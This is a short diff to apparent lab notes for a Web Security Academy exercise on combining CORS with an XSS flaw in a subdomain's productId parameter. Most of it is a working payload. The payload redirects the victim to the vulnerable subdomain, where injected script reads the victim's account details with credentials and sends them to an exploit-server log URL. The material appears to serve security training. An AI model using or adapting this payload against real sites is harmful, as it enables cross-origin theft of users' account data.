@@ -1,4 +1,5 @@
-# The subdomain has an XSS vulnerability in the productId (we verified this by entering <script>alert(0)</script>
+# CORS with XSS Vulnerability
+# The subdomain has an XSS vulnerability in the productId (we verified this by entering <script>alert(0)</script>). This attack is carried out on a malicious server or an exploit server that the victim will access
 
 <script>
     document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
